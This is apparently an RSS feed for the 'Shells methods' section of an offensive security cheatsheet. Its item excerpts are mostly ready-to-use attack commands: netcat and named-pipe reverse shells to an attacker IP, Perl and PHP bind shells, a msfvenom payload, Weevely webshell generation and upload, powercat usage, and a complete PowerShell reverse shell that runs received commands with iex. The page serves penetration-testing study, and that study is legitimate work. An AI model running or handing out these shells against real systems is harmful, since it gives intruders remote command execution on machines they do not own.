<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shells methods on Offensive Security Cheatsheet</title>
    <link>/shells-methods/</link>
    <description>Recent content in Shells methods on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/shells-methods/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Methodology</title>
      <link>/shells-methods/methodology/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/methodology/</guid>
      <description>https://dolosgroup.io/blog/remote-access-cheat-sheet
GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
    </item>
    
    <item>
      <title>Fully Interactive TTY Shell</title>
      <link>/shells-methods/tty_full/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/tty_full/</guid>
      <description>MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port 
Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt;</description>
    </item>
    
    <item>
      <title>Webshell</title>
      <link>/shells-methods/webshell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/webshell/</guid>
      <description> Weevely # Weevely is insane ! # It&amp;#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate &amp;lt;password&amp;gt; &amp;lt;filename&amp;gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely &amp;lt;url&amp;gt; &amp;lt;password</description>
    </item>
    
    <item>
      <title>Reverse Shell</title>
      <link>/shells-methods/reverse/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/reverse/</guid>
      <description>Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator 
Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  
Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
    </item>
    
    <item>
      <title>Bind Shell</title>
      <link>/shells-methods/bind/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/bind/</guid>
      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asphttps://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 
Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; 
PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!</description>
    </item>
    
    <item>
      <title>Windows Shells Methods</title>
      <link>/shells-methods/windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/windows/</guid>
      <description>Powershell # Powershell reverse shell # Scheduled task for example # powershell -enc &amp;lt;base 64 de la commande&amp;gt; $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;10.0.20.12&amp;#34;,443);$stream = $client.GetStream();\ [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\ $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;\ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() WMIexec # wmiexec is less noisy than psexec /usr/bin/impacket-wmiexec d.</description>
    </item>
    
  </channel>
</rss>